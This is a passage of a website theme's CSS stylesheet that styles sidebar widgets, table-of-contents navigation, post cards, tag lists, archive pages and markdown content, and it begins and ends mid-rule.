-o-transition: background 0.2s ease-out; } .widgets .widget-wrapper.user-card .follow svg { margin-right: 6px; height: 1.5em; width: auto; } .widgets .widget-wrapper.user-card .follow:hover { background: #ff5724; } .widgets .widget-wrapper.user-card .buttons { margin: 1rem 0; align-self: stretch; display: grid; grid-gap: 2px; grid-template-columns: repeat(auto-fill, calc((100% - 2 * 2px) / 3)); } .widgets .widget-wrapper.user-card .btn { display: flex; flex-direction: column; align-items: center; color: inherit; border: 1px solid transparent; border-radius: 4px; padding: 0.25rem 0; transition: background 0.2s ease-out; -moz-transition: background 0.2s ease-out; -webkit-transition: background 0.2s ease-out; -o-transition: background 0.2s ease-out; } .widgets .widget-wrapper.user-card .btn:hover { background: var(--block); } .widgets .widget-wrapper.user-card .btn .title { font-size: 1rem; font-weight: 700; } .widgets .widget-wrapper.user-card .btn .desc { font-size: 0.75rem; color: var(--text-p3); font-weight: 500; } .widget-wrapper.post-list .widget-body a { font-size: 0.875rem; padding: 8px 16px; display: block; border-radius: 8px; color: var(--text-p1); transition: background 0.2s ease-out; -moz-transition: background 0.2s ease-out; -webkit-transition: background 0.2s ease-out; -o-transition: background 0.2s ease-out; } .widget-wrapper.post-list .widget-body a.active { background: var(--alpha50); } .widget-wrapper.post-list .widget-body a:hover { background: var(--alpha100); } .widget-wrapper.post-list .widget-body a+a { margin-top: 2px; } .widget-wrapper.post-list .widget-body a { display: flex; justify-content: space-between; align-items: center; } .widget-wrapper.post-list .widget-body a .title { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; } .widget-wrapper.post-list .widget-body a svg { flex-shrink: 0; height: 1em; width: auto; transform: scale(1.2); } .widget-wrapper.post-list .widget-body+.widget-header { margin-top: 28px; } .widget-wrapper.markdown .widget-body { border-radius: 12px; padding: 4px 16px; background: var(--alpha50); } .widget-wrapper.markdown .widget-body a:not([class]) { transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; border-bottom: 1px solid var(--text); color: var(--text); } .widget-wrapper.markdown .widget-body a:not([class]):hover { color: #ff5724; border-bottom: 1px solid #ff5724; } .widget-wrapper.markdown .linklist { margin: 1em 0; } .widget-wrapper.markdown .linklist .link { background: var(--alpha50); } .widget-wrapper.markdown .linklist .link:hover { background: var(--alpha100); } .widget-wrapper.post-card .widget-body { max-width: 100%; } .widget-wrapper.post-card .widget-body .item+.item { margin-top: 8px; } .widget-wrapper.post-card .widget-body .item { line-height: 1.2; background: var(--alpha20); padding: 10px 16px; border-radius: 12px; display: block; border-left: 0; box-sizing: border-box; } .widget-wrapper.post-card .widget-body .title { color: var(--text-p1); font-weight: 500; font-size: 1rem; display: -webkit-box; -webkit-box-orient: vertical; overflow: hidden; -webkit-line-clamp: 1; font-weight: 700; font-size: 0.875rem; } .widget-wrapper.post-card .widget-body .excerpt { color: var(--text-p3); font-size: 0.75rem; margin-top: 0.5rem; display: -webkit-box; -webkit-box-orient: vertical; overflow: hidden; -webkit-line-clamp: 2; } .widget-wrapper.post-card .widget-body .item { transition: background 0.2s ease-out; -moz-transition: background 0.2s ease-out; -webkit-transition: background 0.2s ease-out; -o-transition: background 0.2s ease-out; } .widget-wrapper.post-card .widget-body .item.active { background: var(--alpha50); } .widget-wrapper.post-card .widget-body .item:hover { background: var(--alpha50); } .widget-wrapper.tagcloud .widget-body { border-radius: 12px; padding: 12px 16px; background: var(--alpha50); } .widget-wrapper.tagcloud .widget-body a { word-break: break-word; color: var(--text-p2); line-height: 1.5; } .widget-wrapper.tagcloud .widget-body a:hover { color: #ff5724; } .widget-wrapper.timeline .tag-plugin.timeline { padding-left: 0; } .widget-wrapper.timeline .tag-plugin.timeline:before { left: 6px; } .widget-wrapper.timeline .widget-body { overflow: hidden; } .widget-wrapper.timeline .body a { transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; word-break: break-all; --fsp: calc(17px - 2px); } .widget-wrapper.timeline .tag-plugin.timeline .timenode { z-index: 1; margin-top: 0.25rem; } .widget-wrapper.timeline .tag-plugin.timeline .timenode .header { margin: 0.25rem var(--gap-padding); } .widget-wrapper.timeline .tag-plugin.timeline .timenode .header .user-info { background: none; padding-right: 0; } .widget-wrapper.timeline .tag-plugin.timeline .timenode .header img { display: none; } .widget-wrapper.timeline .tag-plugin.timeline .timenode .header:before { left: calc(6px - var(--gap-padding)); } .widget-wrapper.timeline .tag-plugin.timeline .timenode .body { border-radius: 12px; padding: 0.5rem 1rem; } .widget-wrapper.timeline .tag-plugin.timeline .timenode .body p, .widget-wrapper.timeline .tag-plugin.timeline .timenode .body li { --fsp: calc(17px - 3px); } .widget-wrapper.timeline .tag-plugin.timeline .timenode .body code { background: none; padding: 0; margin: 0; } .widget-wrapper.timeline .tag-plugin.timeline .timenode .body .highlight, .widget-wrapper.timeline .tag-plugin.timeline .timenode .body pre:not([class]):has(>code) { background: var(--alpha50); } .widget-wrapper.timeline .tag-plugin.timeline[api] .body .footer { background: none; } .l_left .widget-wrapper.timeline .tag-plugin.timeline { padding-left: 0; } .l_left .widget-wrapper.timeline .tag-plugin.timeline:before { content: none; } .l_left .widget-wrapper.timeline .body { box-shadow: none; background: var(--alpha50); } .widget-wrapper.toc { background: var(--site-bg); z-index: 3; } .widget-wrapper.toc .widget-body { position: relative; } .widget-wrapper.toc .widget-body:before { content: ''; position: absolute; top: 6px; bottom: 6px; left: 0; width: 4px; background: var(--block); border-radius: 4px; } .widget-wrapper.toc .toc { --fsp: calc(17px - 2px); padding: 0; margin: 0; position: relative; list-style: none; } .widget-wrapper.toc .toc li { margin: 0; list-style: none; } .widget-wrapper.toc .toc a { --padding: calc(var(--gap-padding) / 2); --padding-offset: calc(0 - var(--padding)); padding: 6px var(--padding); margin: 0 var(--padding); color: var(--text-p3); display: block; position: relative; border-radius: 8px; transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; } .widget-wrapper.toc .toc a.active:before { content: ''; position: absolute; top: 6px; bottom: 6px; left: -8px; width: 4px; background: #1cd0fd; border-radius: 4px; } .widget-wrapper.toc .toc a:hover { background: var(--block-hover); color: var(--text); } .l_right .widgets .widget-wrapper.toc { margin-top: 0; position: sticky; position: -webkit-sticky; top: 0; padding: 16px 0; } .l_right .widgets .widget-wrapper.toc:first-child { top: 8px; padding-top: 8px; } .l_right .widgets .widget-wrapper.toc .widget-body .toc { max-height: 70vh; overflow: auto; } @media screen and (max-width: 1180px) { .l_right .widgets .widget-wrapper.toc .widget-body .toc { max-height: unset; } } .l_right .widgets .widget-wrapper.toc .widget-body .toc::-webkit-scrollbar { height: 0; width: 0; } .l_right .widgets .widget-wrapper.toc .widget-body .toc::-webkit-scrollbar-track-piece { background: transparent; } .l_right .widgets .widget-wrapper.toc .widget-body .toc::-webkit-scrollbar-thumb { background: var(--text-meta); cursor: pointer; border-radius: 0; } .l_right .widgets .widget-wrapper.toc .widget-body .toc::-webkit-scrollbar-thumb:hover { background: var(--text-p3); } .widget-wrapper.toc .toc .toc-item { font-weight: 500; --fsp: calc(17px - 1px); } .widget-wrapper.toc .toc .toc-item .toc-item { font-weight: 400; --fsp: calc(17px - 2px); } .widget-wrapper.toc .toc ol { padding-left: 0; } .widget-wrapper.toc .toc .toc-child .toc-link { padding-left: 1.5rem; } .widget-wrapper.toc .toc .toc-child .toc-child .toc-link { padding-left: 2.5rem; } .widget-wrapper.toc .toc .toc-child .toc-child .toc-child .toc-link { padding-left: 3.5rem; } .widget-wrapper.toc .toc .toc-child .toc-child .toc-child .toc-child .toc-link { padding-left: 4.5rem; } .widget-wrapper.toc .toc .toc-child .toc-child .toc-child .toc-child .toc-child .toc-link { padding-left: 5rem; } .widget-wrapper.toc .toc a.toc-link.active { color: var(--text); } .widget-wrapper.toc .toc a.toc-link.active:before, .widget-wrapper.toc .toc a.toc-link.active:after { content: ''; } .widget-wrapper.toc[collapse='true'] .toc-item a.toc-link+ol { display: none; } .widget-wrapper.toc[collapse='true'] .toc a.toc-link.active+ol { display: block; } .widget-wrapper.toc[collapse='auto'] .toc-item a.toc-link+ol { display: none; } .widget-wrapper.toc[collapse='auto'] .toc a.toc-link.active+ol { display: block; } .widget-wrapper.toc[collapse='auto']:hover a.toc-link+ol { display: block; } .widget-wrapper.toc[collapse='true'] ol:has(> .toc-item a.active) { display: block; } .widget-wrapper.toc[collapse='auto'] ol:has(> .toc-item a.active) { display: block; } .widget-wrapper.toc .widget-body { display: grid; grid-template-rows: 1fr; transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; overflow: hidden; } .l_right .widgets .widget-wrapper.toc .widget-header .cap-action:hover { background: var(--block-border); } .l_right .widgets .widget-wrapper.toc.collapse .widget-header .cap-action { background: var(--block-border); } .l_right .widgets .widget-wrapper.toc.collapse .widget-body { grid-template-rows: 0fr; } .widget-wrapper.toc .widget-body+.widget-footer:before { content: ''; position: absolute; background: var(--block-border); top: 0; height: 1px; left: var(--gap-padding); right: var(--gap-padding); } .widget-wrapper.toc .widget-footer { margin-top: 8px; color: var(--text-p2); position: relative; padding-top: 8px; } .widget-wrapper.toc .widget-footer a { display: flex; align-items: center; color: inherit; font-size: 0.875rem; padding: 8px var(--gap-padding); border-radius: 8px; transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; } .widget-wrapper.toc .widget-footer a svg, .widget-wrapper.toc .widget-footer a img { height: 16px; width: auto; margin-right: 8px; } .widget-wrapper.toc .widget-footer a:hover { background: var(--block-hover); color: var(--text); } .widget-wrapper.toc+.widget-wrapper { padding-top: 32px; } @media screen and (max-width: 1180px) { .l_right { background: var(--blur-bg); } @supports ((-webkit-backdrop-filter: blur(var(--blur-px))) or (backdrop-filter: blur(var(--blur-px)))) { .l_right { background: var(--blur-bg) !important; backdrop-filter: saturate(200%) blur(var(--blur-px)); -webkit-backdrop-filter: saturate(200%) blur(var(--blur-px)); } } .l_right:hover { background: var(--card); } .l_right .widgets .widget-wrapper.toc { position: static; background: none; } .widget-wrapper.toc .toc a { color: var(--text-p2); } .widget-wrapper.toc .widget-footer a { background: var(--alpha100); } .widget-wrapper.toc .widget-footer a+a { margin-top: 4px; } } .widgets .loading-wrap { margin: 0.5rem 0; background: var(--alpha50); } .widgets { overflow: scroll; flex-grow: 1; scrollbar-width: none; z-index: 1; line-height: 1.2; margin: 0 var(--gap-margin); } .widgets::-webkit-scrollbar { height: 0; width: 0; } .widgets::-webkit-scrollbar-track-piece { background: transparent; } .widgets::-webkit-scrollbar-thumb { background: var(--text-meta); cursor: pointer; border-radius: 0; } .widgets::-webkit-scrollbar-thumb:hover { background: var(--text-p3); } .widgets .widget-wrapper .widget-header { padding-left: var(--gap-padding); padding-right: var(--gap-padding); display: flex; justify-content: space-between; align-items: baseline; line-height: 28px; font-weight: 500; font-size: 0.8125rem; color: var(--text-p1); } .widgets .widget-wrapper .widget-header .item { display: block; } .widgets .widget-wrapper .widget-header >span { text-align: left; opacity: 0.6; } .widgets .widget-wrapper .widget-header:empty { display: none; } .widgets .widget-wrapper .widget-header .cap-action { line-height: 0; color: inherit; opacity: 0.6; transition: opacity 0.2s ease-out, background 0.2s ease-out; -moz-transition: opacity 0.2s ease-out, background 0.2s ease-out; -webkit-transition: opacity 0.2s ease-out, background 0.2s ease-out; -o-transition: opacity 0.2s ease-out, background 0.2s ease-out; border-radius: 4px; padding: 6px; margin-right: -6px; } .widgets .widget-wrapper .widget-header .cap-action svg { height: 1em; width: auto; transform: scale(1.2); fill: var(--text-p2); } .widgets .widget-wrapper .widget-header .cap-action:hover { color: #ff5724; background: var(--alpha100); opacity: 1; } .widgets .widget-wrapper .widget-header .cap-action:hover svg { fill: #ff5724; } .widgets .widget-wrapper .widget-body { color: var(--text-p1); } .widgets .widget-wrapper .widget-body p { margin-top: 0.5em; margin-bottom: 0.5em; line-height: 1.5; } .widget-wrapper { display: block; padding-bottom: 32px; } .l_left .widgets .widget-wrapper:first-child { margin-top: 32px; } .l_right .widgets:empty { display: none; } .l_right .widgets .widget-wrapper .widget-header { padding-left: var(--gap-padding); padding-right: var(--gap-padding); } @media screen and (max-width: 1180px) { .l_right .widgets .widget-wrapper { margin-top: var(--gap-margin); border-radius: 12px; } } @media screen and (min-width: 1180px) { .l_right .widgets .widget-wrapper.markdown .widget-body { background: var(--block); } } .post-list #archive { padding: 1rem; } .post-list #archive .archive-header { display: inline-block; font-family: Menlo, Monaco, Consolas, system-ui, \"Courier New\", monospace, sans-serif; font-weight: 700; line-height: 1.2; margin-bottom: 0.5em; position: relative; padding: 4px 0; color: var(--text-p1); } .post-list #archive .archive-header:after { content: \"\"; position: absolute; height: 4px; bottom: 0; left: 0; right: 0; z-index: -1; border-radius: 4px; background: #1cd0fd; } .post-list #archive a.post { display: inline-flex; align-items: baseline; margin: 0.25rem 0; color: var(--text-p1); transition: color 0.2s ease-out, border 0.2s ease-out; -moz-transition: color 0.2s ease-out, border 0.2s ease-out; -webkit-transition: color 0.2s ease-out, border 0.2s ease-out; -o-transition: color 0.2s ease-out, border 0.2s ease-out; border-bottom: 1px dashed var(--text-meta); } .post-list #archive a.post time { font-family: Menlo, Monaco, Consolas, system-ui, \"Courier New\", monospace, sans-serif; margin-right: 1em; font-weight: 700; flex-shrink: 0; color: var(--text-p4); } .post-list #archive a.post:hover { border-bottom: 1px solid #1cd0fd; color: var(--text); } .post-list #archive a.post:hover time { color: #1cd0fd; } .post-list #cats { padding: 0; } .post-list #cats a.cat { display: flex; padding: 0.5em 1rem; border-radius: 8px; color: var(--text-p2); align-items: center; justify-content: space-between; font-weight: 500; font-size: calc(17px - 2px); } .post-list #cats a.cat.child { padding-left: 2rem; } .post-list #cats a.cat span { display: flex; align-items: center; } .post-list #cats a.cat svg { height: 1em; width: auto; transform: scale(1.2); margin-right: 8px; } .post-list #cats a.cat .badge { font-weight: 700; font-family: Menlo, Monaco, Consolas, system-ui, \"Courier New\", monospace, sans-serif; opacity: 0.5; font-size: 0.75rem; } .post-list #cats a.cat:hover { background: var(--block-hover); color: var(--text); } .post-list #cats a.cat:hover .badge { opacity: 1; color: #1cd0fd; } .post-list #tags { display: flex; flex-wrap: wrap; padding: 0; margin: 0 -4px; } .post-list #tags a.tag { display: inline-flex; align-items: center; position: relative; color: var(--text-p2); margin: 4px; padding: 0.5em 0.75rem; border-radius: 4px; background: var(--block); font-size: 0.8125rem; font-weight: 500; } .post-list #tags a.tag:before { content: \"#\"; margin-left: -2px; margin-right: 2px; opacity: 0.4; } .post-list #tags a.tag:hover { color: var(--text); background: var(--block-hover); } .post-list #tags a.tag:hover:before { color: #1cd0fd; opacity: 1; } @media screen and (min-width: 500px) { .post-list.author #archive { padding: 1rem 0; } } .md-text.error-page { text-align: center; margin-top: 2rem; } .md-text.error-page img#error { width: 30vw; max-height: 150px; margin-bottom: 2rem; } .md-text.error-page h1 { font-size: 4rem; margin-bottom: 0; } .md-text.error-page p.what, .md-text.error-page p.why { margin: 0.5em; } .md-text.error-page p.why { font-size: 0.8125rem; } .md-text.error-page a#back { margin: 2rem 0; display: inline-block; background: #fdb62f; color: #000; border: 2px solid #000; } @media screen and (max-width: 768px) { .md-text.error-page { margin-top: 4rem; } } .md-text .tag-list { display: flex; flex-wrap: wrap; padding: 0; margin-top: 2rem; } .md-text .tag-list a.tag { display: inline-flex; align-items: center; position: relative; color: var(--text-p2); margin: 4px; padding: 0.5em 0.75rem; border-radius: 4px; background: var(--block); font-size: 0.8125rem; font-weight: 500; } .md-text .tag-list a.tag:before { content: \"#\"; margin-left: -2px; margin-right: 2px; opacity: 0.4; } .md-text .tag-list a.tag:hover { color: var(--text); background: var(--block-hover); } .md-text .tag-list a.tag:hover:before { color: #1cd0fd; opacity: 1; } .post-list .post-card .meta.cap .tag:before { content: \"#\"; margin-left: -2px; margin-right: 2px; opacity: 0.4; } .widget-body.tag-tree .tag-subtree > a > .tag-switcher-wrapper { width: 1.75rem; height: 0.875rem; display: flex; justify-content: end; align-items: center; } .widget-body.tag-tree .tag-subtree > a > .tag-switcher-wrapper:hover { color: #1cd0fd; } .widget-body.tag-tree .tag-subtree.parent-tag > a .tag-switcher { display: inline-block; height: 0.5rem; width: 0.5rem; border-width: 1px; border-style: none solid solid none; transform: translateX(-25%) rotate(-45deg); } .widget-body.tag-tree .tag-subtree.parent-tag.expanded > a .tag-switcher { transform: translateY(-25%) rotate(45deg); } .widget-body.tag-tree .tag-subtree.parent-tag > .tag-subtree { display: none; } .widget-body.tag-tree .tag-subtree.parent-tag.expanded > .tag-subtree { display: block; } .widget-body.tag-tree .tag-subtree .tagcon { font-size: smaller; opacity: 0.4; margin-right: 0.25rem; } .l_body { display: grid; grid-template-columns: 1fr minmax(200px, var(--width-main)) 1fr; grid-gap: var(--gap-margin); margin: auto; font-size: var(--fsp); } .l_body aside { z-index: 8; flex-shrink: 0; position: sticky; position: -webkit-sticky; --width-sidebar: calc(var(--gap-margin) * 2 + var(--gap-padding) * 2 + var(--side-content-width)); width: var(--width-sidebar); } .l_body .l_left { justify-self: right; top: 8px; } .l_body .l_right { justify-self: left; --gap-margin: 0px; max-height: calc(100% - 8px * 2); } .l_body .l_right .widgets { height: 100%; overflow: visible; } @media screen and (max-width: 1180px) { .l_body .l_right { --gap-margin: 16px; } .laptop-only { display: block !important; } .l_body .l_right { top: 8px; position: fixed; max-height: calc(100% - 8px * 2); transform: translateX(320px); transition: transform 0.38s ease-out; margin: 0; right: 8px; box-shadow: 0 12px 16px -4px rgba(0,0,0,0.2); z-index: 10; background: var(--site-bg); overflow: auto; --blur-bg: var(--alpha60); --blur-px: 50px; } .l_body .l_right::-webkit-scrollbar { height: 0; width: 0; } .l_body .l_right::-webkit-scrollbar-track-piece { background: transparent; } .l_body .l_right::-webkit-scrollbar-thumb { background: var(--text-meta); cursor: pointer; border-radius: 0; } .l_body .l_right::-webkit-scrollbar-thumb:hover { background: var(--text-p3); } .l_body[rightbar] .l_right { transform: translateX(0px); } .l_body[rightbar] .main-mask { pointer-events: inherit; } } @media screen and (max-width: 667px) { .mobile-only { display: block !important; } .l_body { padding: 0; display: block; } .l_body .l_left { position: fixed; transform: translateX(-320px); transition: transform 0.38s ease-out; margin: 0; left: 8px; box-shadow: 0 12px 16px -4px rgba(0,0,0,0.2); z-index: 10; } .l_body .l_main { max-width: 100%; } .l_body[leftbar] .l_left { transform: translateX(0px); } .l_body[leftbar] .main-mask { opacity: 1; pointer-events: inherit; } } .main-mask { position: fixed; pointer-events: none; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.1); z-index: 9; opacity: 0; transition: opacity 0.2s ease-out; -moz-transition: opacity 0.2s ease-out; -webkit-transition: opacity 0.2s ease-out; -o-transition: opacity 0.2s ease-out; } .l_main .post-list { margin: 1rem; } .l_main .post-list .post-title:first-child { margin-top: 0.5rem; } .l_main .post-list .post-title { font-weight: 500; margin: 1.25rem auto 0.75rem 0; line-height: 1.2; font-size: calc(17px + 4px); border-bottom: none; color: var(--text); transition: color 0.2s ease-out; -moz-transition: color 0.2s ease-out; -webkit-transition: color 0.2s ease-out; -o-transition: color 0.2s ease-out; } @media screen and (max-width: 500px) { .l_main .post-list .post-title { font-size: calc(17px + 2px); margin: 0.5rem 0; } } .l_main .post-list .wiki .post-title { margin-top: 0.5rem; } .post-list .post-card { display: block; margin: 1rem 0; border-radius: 12px; background: var(--card); transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; overflow: hidden; z-index: 0; position: relative; } :root[data-theme=\"light\"] .post-list .post-card { box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1); } :root[data-theme=\"light\"] .post-list .post-card:hover { box-shadow: 0 12px 20px -4px rgba(0,0,0,0.15); transform: translate3d(0, -2px, 0); } :root[data-theme=\"dark\"] .post-list .post-card:hover { box-shadow: 0 0 4px -2px #1cd0fd, 0 0 24px -8px #1cd0fd; } :root:not([data-theme]) .post-list .post-card { box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1); } :root:not([data-theme]) .post-list .post-card:hover { box-shadow: 0 12px 20px -4px rgba(0,0,0,0.15); transform: translate3d(0, -2px, 0); } @media (prefers-color-scheme: dark) { :root:not([data-theme]) .post-list .post-card:hover { box-shadow: 0 0 4px -2px #1cd0fd, 0 0 24px -8px #1cd0fd; } } .post-list .post-card .excerpt { margin: 1rem 0; } @media screen and (max-width: 500px) { .post-list .post-card .excerpt { margin: 0.5rem 0; } } .post-list .post-card .excerpt >p { margin: 1rem 0; line-height: 1.5; } @media screen and (max-width: 500px) { .post-list .post-card .excerpt >p { margin: 0.5rem 0; } } .post-list .post-card .meta.cap { flex-wrap: wrap; margin: 0; line-height: 2; --fsp: calc(17px - 1px); font-size: var(--fsp); } .post-list .post-card .meta.cap, .post-list .post-card .meta.cap span { display: flex; align-items: center; } .post-list .post-card .meta.cap svg { height: 1em; width: auto; line-height: 0; transform: scale(1.2); margin-right: 8px; } .post-list .post-card .meta.cap >span+span { margin-left: 1.5rem; } .post-list .post-card .meta.cap span.pin img { object-fit: contain; } .post-list .post-card .meta.cap span.pin svg { color: #f44336; } .post-list.post .post-card:hover img { filter: brightness(50%); } .post-list .md-text { padding: 1rem; } @media screen and (max-width: 500px) { .post-list .md-text { padding: 0.5rem 1rem; } } .post-list .md-text p { color: var(--text-p2); font-size: 0.875rem; } .post-list .post-card .post-cover { overflow: hidden; width: calc(100% + 2 * 1rem); border-radius: 0; margin-left: -1rem; margin-top: -1rem; margin-right: -1rem; background: var(--block); } .post-list .post-card .post-cover:not(.lazy) { transition: transform 1s ease-out; -moz-transition: transform 1s ease-out; -webkit-transition: transform 1s ease-out; -o-transition: transform 1s ease-out; } .post-list .post-card .post-cover img { object-fit: cover; width: 100%; border-radius: 0; aspect-ratio: 2.4; } .post-list .post-card.post.photo .cover { position: relative; line-height: 0; } .post-list .post-card.post.photo .cover img { width: 100%; object-fit: cover; aspect-ratio: 2.4; } .post-list .post-card.post.photo .cover .cover-info { padding: 1.5rem 1rem; position: absolute; line-height: 1.2; width: calc(100% - 1rem * 2); --text-banner: #fff; color: var(--text-banner); } .post-list .post-card.post.photo .cover .cover-info[position=top] { top: 0; background-image: linear-gradient(rgba(0,0,0,0.2), rgba(0,0,0,0)); } .post-list .post-card.post.photo .cover .cover-info[position=bottom] { bottom: 0; background-image: linear-gradient(rgba(0,0,0,0), rgba(0,0,0,0.2)); } .post-list .post-card.post.photo .cover .cover-info div+div { margin-top: 4px; } .post-list .post-card.post.photo .cover .cover-info .cap { font-size: 0.8125rem; color: unset; } .post-list .post-card.post.photo .cover .cover-info .title { font-weight: 500; font-size: calc(17px + 7px); } @media screen and (max-width: 500px) { .post-list .post-card.post.photo .cover .cover-info { padding: 1rem; } .post-list .post-card.post.photo .cover .cover-info div+div { margin-top: 2px; } .post-list .post-card.post.photo .cover .cover-info .title { font-size: calc(17px + 4px); } .post-list .post-card.post.photo .cover .cover-info .cap { font-size: 0.75rem; } } .post-list .post-card.post.photo h2 { margin: 0.25rem 0; font-size: calc(17px + 4px); } .post-list .post-card.wiki article { display: flex; flex-wrap: wrap; transition: box-shadow 0.2s ease-out; -moz-transition: box-shadow 0.2s ease-out; -webkit-transition: box-shadow 0.2s ease-out; -o-transition: box-shadow 0.2s ease-out; justify-content: center; padding: 1rem 0.5rem; } .post-list .post-card.wiki article .preview { display: flex; margin: 1rem 3rem; align-items: center; } .post-list .post-card.wiki article .preview img { width: 96px; max-height: 96px; object-fit: contain; } .post-list .post-card.wiki article .preview img:not(.lazy) { transition: transform 0.75s ease-out; -moz-transition: transform 0.75s ease-out; -webkit-transition: transform 0.75s ease-out; -o-transition: transform 0.75s ease-out; } .post-list .post-card.wiki article .excerpt { margin: 1rem 0.5rem; min-width: 280px; flex: 1; overflow: hidden; word-wrap: break-word; } @media screen and (min-width: 950px) { .post-list .post-card.wiki article .excerpt { margin-right: 2rem; } } .post-list .post-card.wiki article .excerpt .caps { line-height: 1; margin-bottom: 0.75rem; } .post-list .post-card.wiki article .excerpt .cap { --theme-block: var(--block); background: var(--theme-block); padding: 2px 4px; border-radius: 2px; } .post-list .post-card.wiki article .excerpt p:last-child { margin-bottom: 0; } .post-list .post-card.wiki article .excerpt .cap+.cap { margin-left: 4px; } @media screen and (max-width: 500px) { .post-list.archives { margin: 1rem 0; } } .l_main { position: relative; padding-bottom: var(--gap-max); } @media screen and (min-width: 667px) { .l_main { padding-top: 8px; } } .l_main header { margin: 2rem 1rem 1rem; } .l_main header .logo-wrap { margin: 0; } @media screen and (max-width: 667px) { .l_body.index .l_main { padding-top: 0; } } body>.sitebg { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background-size: cover; } body>.sitebg .siteblur { width: 100%; height: 100%; background: var(--blur-bg); --blur-px: 100px; --blur-bg: var(--alpha75); } @supports ((-webkit-backdrop-filter: blur(var(--blur-px))) or (backdrop-filter: blur(var(--blur-px)))) { body>.sitebg .siteblur { background: var(--blur-bg) !important; backdrop-filter: saturate(200%) blur(var(--blur-px)); -webkit-backdrop-filter: saturate(200%) blur(var(--blur-px)); } } body>.sitebg .siteblur:hover { background: var(--card); } .md-text { max-width: 100%; padding: 1rem; color: var(--text-p1); line-height: 1.6; word-break: break-word; } .md-text.excerpt p { font-size: 0.875rem; margin: 1em 0; } .md-text.content { position: relative; padding-top: 0; padding-bottom: 2rem; overflow: hidden; } .l_body[text-indent] .md-text.content p:not([class]) { text-indent: calc(var(--fsp) * 2); text-align: justify; } .l_body[text-indent] .md-text.content p:not([class]) a { text-indent: 0; } .l_body[text-indent] .md-text.content ol, .l_body[text-indent] .md-text.content ul { margin-left: 0.5em; } .l_body[text-indent] .md-text.content h1, .l_body[text-indent] .md-text.content h2, .l_body[text-indent] .md-text.content h3, .l_body[text-indent] .md-text.content h4, .l_body[text-indent] .md-text.content h5, .l_body[text-indent] .md-text.content h6 { text-align: center; } .l_body[text-indent] .md-text.content h1 >a:first-child, .l_body[text-indent] .md-text.content h2 >a:first-child, .l_body[text-indent] .md-text.content h3 >a:first-child, .l_body[text-indent] .md-text.content h4 >a:first-child, .l_body[text-indent] .md-text.content h5 >a:first-child, .l_body[text-indent] .md-text.content h6 >a:first-child { display: none; } .l_body[text-indent] .md-text.content h2 { margin: 2em 0 1.5em; } .l_body[text-indent] .md-text.content blockquote p:not([class]), .l_body[text-indent] .md-text.content .poetry p:not([class]), .l_body[text-indent] .md-text.content .okr p:not([class]), .l_body[text-indent] .md-text.content .timeline p:not([class]), .l_body[text-indent] .md-text.content li p:not([class]), .l_body[text-indent] .md-text.content .article-footer p:not([class]) { text-indent: 0; text-align: left; } .md-text ul:not(:last-child), .md-text ol:not(:last-child) { padding-bottom: 0.5rem; margin: 0; } .md-text blockquote p, .md-text ul p, .md-text ol p, .md-text blockquote ul, .md-text ul ul, .md-text ol ul, .md-text blockquote ol, .md-text ul ol, .md-text ol ol { --fsp: calc(17px - 1px); font-size: var(--fsp); line-height: 1.5; } .md-text blockquote p code, .md-text ul p code, .md-text ol p code, .md-text blockquote ul code, .md-text ul ul code, .md-text ol ul code, .md-text blockquote ol code, .md-text ul ol code, .md-text ol ol code { font-size: inherit; padding: 0; background: none; } .md-text p *, .md-text blockquote *, .md-text .tag-plugin *, .md-text ul *, .md-text ol *, .md-text .highlight *, .md-text table * { --gap-p: var(--gap-p-compact); } .md-text p, .md-text ul, .md-text ol { margin-top: calc(var(--gap-p) - 4px); margin-bottom: calc(var(--gap-p) - 4px); } .md-text .tag-plugin, .md-text iframe { margin-top: var(--gap-p); margin-bottom: var(--gap-p); } .md-text iframe { display: block; } .md-text.content h1, .md-text.content h2, .md-text.content h3, .md-text.content h4, .md-text.content h5, .md-text.content h6 { color: var(--text); line-height: 1.8; } .md-text.content h1 >a:first-child, .md-text.content h2 >a:first-child, .md-text.content h3 >a:first-child, .md-text.content h4 >a:first-child, .md-text.content h5 >a:first-child, .md-text.content h6 >a:first-child { background: #1cd0fd; border-radius: 2px; margin-right: 8px; transition: background 0.2s ease-out; -moz-transition: background 0.2s ease-out; -webkit-transition: background 0.2s ease-out; -o-transition: background 0.2s ease-out; } .md-text.content h1 >a:first-child:hover, .md-text.content h2 >a:first-child:hover, .md-text.content h3 >a:first-child:hover, .md-text.content h4 >a:first-child:hover, .md-text.content h5 >a:first-child:hover, .md-text.content h6 >a:first-child:hover { background: #ff5724; } .md-text.content h1 >a:first-child:before, .md-text.content h2 >a:first-child:before, .md-text.content h3 >a:first-child:before, .md-text.content h4 >a:first-child:before, .md-text.content h5 >a:first-child:before, .md-text.content h6 >a:first-child:before { content: ''; color: #fff; font-weight: 700; padding: 0 2px; font-size: 0.75rem; } .md-text.content h2 { font-weight: 500; } .md-text.content h2 >a:first-child:before { content: ':'; } .md-text.content blockquote h2, .md-text.content .tag-plugin h2, .md-text.content blockquote h3, .md-text.content .tag-plugin h3, .md-text.content blockquote h4, .md-text.content .tag-plugin h4, .md-text.content blockquote h5, .md-text.content .tag-plugin h5, .md-text.content blockquote h6, .md-text.content .tag-plugin h6 { margin-top: 0.25em; margin-bottom: 0.25em; } .md-text.content:first-child .tag-plugin:first-child { margin-top: 0; } .md-text p { font-size: var(--fsp); } .md-text pre { -webkit-font-smoothing: auto; -moz-osx-font-smoothing: auto; } .md-text pre.mermaid { overflow: auto; } .md-text .center { align-self: center; } .md-text>div { margin: var(--gap-p) 0; } .md-text img { border-radius: 12px; margin: auto; display: block; } li:not([class]) a:not([class]), 